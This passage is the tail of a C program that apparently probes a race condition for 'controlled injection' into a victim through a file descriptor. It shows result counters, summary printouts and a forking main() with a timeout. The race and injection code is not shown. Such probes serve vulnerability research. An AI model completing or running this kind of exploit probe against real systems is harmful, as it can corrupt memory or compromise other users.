            printf("[*] summary so far: race_wins=%d seeded=%d victim_hits=%d\n",
                   race_wins, seed_hits, victim_hits);
            close(g_fd);
            return;
        }
        if (rc < 0) {
            printf("\n[-] Probe aborted on iter %d due to setup error\n", i);
            close(g_fd);
            return;
        }
    }

    printf("\n[*] No controlled-injection signal in %d iterations\n", MAX_RACE_ITERS);
    printf("[*] summary: race_wins=%d seeded=%d victim_hits=%d\n",
           race_wins, seed_hits, victim_hits);
    close(g_fd);
}

int main(void)
{
    pid_t pid;
    int status;

    pid = fork();
    if (pid < 0)
        return 1;
    if (pid == 0) {
        alarm(90);
        run_probe();
        _exit(0);
    }

    waitpid(pid, &status, 0);
    if (WIFSIGNALED(status))
        printf("[!] Child killed by signal %d\n", WTERMSIG(status));
    return 0;
}
